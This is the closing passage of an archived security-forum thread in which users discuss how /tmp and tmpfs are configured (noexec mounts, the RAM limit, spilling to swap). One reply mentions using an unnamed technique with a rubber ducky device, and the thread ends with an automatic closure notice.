<div class="post" itemprop="text">
<p>Right, some distros choose to go against what upstream suggests, usually (then they run scripts to purge it when shutting down, or they don’t). Somtimes, the admin may configure it to be on the disk, or have it mounted with noexec by putting an entry in fstab or something of that kind.</p>
<p>This should also be kept in mind: tmpfs filesystems by default are given around 50% of the RAM, and they’re mapped to swap by default, so once you fill it up to its capacity, it may start to write to your swap partition if you have one, and that will actually write to your disk.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="4" />
<span class="post-likes">4 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_11" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/0x00pf"><span itemprop="name">0x00pf</span></a>
(pico)
</span>
<link itemprop="mainEntityOfPage" href="2166.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-06-02T18:41:36Z" class="post-time">
June 2, 2017, 6:41pm
</time>
<meta itemprop="dateModified" content="2017-06-02T18:41:36Z">
<span itemprop="position">11</span>
</span>
</div>
<div class="post" itemprop="text">
<aside class="quote no-group" data-username="kowalski" data-post="10" data-topic="2166">
<div class="title">
<div class="quote-controls"></div>
<img alt width="20" height="20" src="../../user_avatar/0x00sec.org/kowalski/40/1711_2.png" class="avatar"> kowalski:</div>
<blockquote>
<p>This should also be kept in mind: tmpfs filesystems by default are given around 50% of the RAM, and they’re mapped to swap by default, so once you fill it up to its capacity, it may start to write to your swap partition if you have one, and that will actually write to your disk.</p>
</blockquote>
</aside>
<p>Haven’t thought about that. It is a very good point. There are a couple of things to check before dumping stuff in a tmpfs!. Thanks for the great comments</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="3" />
<span class="post-likes">3 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_12" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/pry0cc"><span itemprop="name">pry0cc</span></a>
(Leader &amp; Offsec Engineer &amp; Forum Daddy)
</span>
<link itemprop="mainEntityOfPage" href="2166.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-06-03T07:43:28Z" class="post-time">
June 3, 2017, 7:43am
</time>
<meta itemprop="dateModified" content="2017-06-03T07:54:37Z">
<span itemprop="position">12</span>
</span>
</div>
<div class="post" itemprop="text">
<p>You found a way. That is so good.</p>
<p>This kind of attack would be really cool with a rubber ducky.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="3" />
<span class="post-likes">3 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_13" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/system"><span itemprop="name">system</span></a>
(system)
Closed
</span>
<link itemprop="mainEntityOfPage" href="2166.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2018-01-21T00:36:57Z" class="post-time">
January 21, 2018, 12:36am
</time>
<meta itemprop="dateModified" content="2018-01-21T00:36:57Z">
<span itemprop="position">13</span>
</span>
</div>
<div class="post" itemprop="text">
<p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
</div>
</div>
<footer class="container wrap">
<nav class="crawler-nav">
<ul>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../index.html" itemprop="url">Home </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../categories.html" itemprop="url">Categories </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="https://0x00sec.org/guidelines" itemprop="url">FAQ/Guidelines </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../tos.html" itemprop="url">Terms of Service </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../privacy.html" itemprop="url">Privacy Policy </a>
</span>
</li>
</ul>
</nav>
<p class="powered-by-link">Powered by <a href="https://www.discourse.org">Discourse</a>, best viewed with JavaScript enabled</p>
</footer>
<script src="https://instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
</body>
</html>
